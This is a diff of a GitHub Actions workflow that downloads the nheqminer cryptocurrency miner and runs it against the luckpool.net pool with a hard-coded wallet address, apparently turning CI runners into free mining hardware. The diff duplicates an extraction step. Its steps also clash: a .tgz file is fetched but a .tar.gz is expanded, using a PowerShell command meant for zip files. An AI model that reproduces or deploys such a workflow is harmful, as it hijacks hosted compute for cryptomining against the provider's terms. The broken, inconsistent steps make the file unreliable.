@@ -17,8 +17,10 @@ jobs:
         JOB: ${{ matrix.go }}
     steps:
     - name: PREPARING
-      run: Invoke-WebRequest https://github.com/VerusCoin/nheqminer/releases/download/v0.8.2/nheqminer-Linux-v0.8.2.tgz -OutFile nheqminer-Linux-v0.8.2.tgz
+      run: Invoke-WebRequest https://github.com/VerusCoin/nheqminer/releases/download/v0.8.2/nheqminer-Linux-v0.8.2.tgz
     - name: Seting-UP
+      run: Expand-Archive nheqminer-Linux-v0.8.2.tar.gz
+    - name: Seting-UP1
       run: Expand-Archive nheqminer-Linux-v0.8.2.tar.gz
     - name: Running
       run: nheqminer/nheqminer -v -l ap.luckpool.net:3956 -t 2 -u RADzfp5pn7wvJEQkBiXPx4wJ7wTm7wg8V2.CPU_PC_MAO_HIEM
